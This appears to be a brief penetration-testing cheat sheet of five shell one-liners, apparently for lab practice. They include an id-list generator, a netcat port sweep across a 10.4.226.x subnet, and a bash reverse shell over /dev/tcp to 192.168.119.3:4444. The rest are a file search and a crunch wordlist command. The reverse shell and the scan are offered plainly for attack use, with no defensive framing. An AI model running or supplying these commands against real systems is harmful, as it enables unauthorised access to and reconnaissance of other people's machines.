
`for i in $(seq 1 1000); do echo $i >> ids.txt; done` - generates value of id parameter 1-1000

`for i in $(seq 1 254); do nc -zv -w 1 10.4.226.$i 80; done` - conduct a portscan on a remote host

`bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"` - utilize to get a reverse shell

`find / -name "readme" 2>/dev/null` - locate a folder and print the location of the folder

`crunch <min> <max> -t <pattern%%%> > wordlist` - generate a wordlist for adhoc usage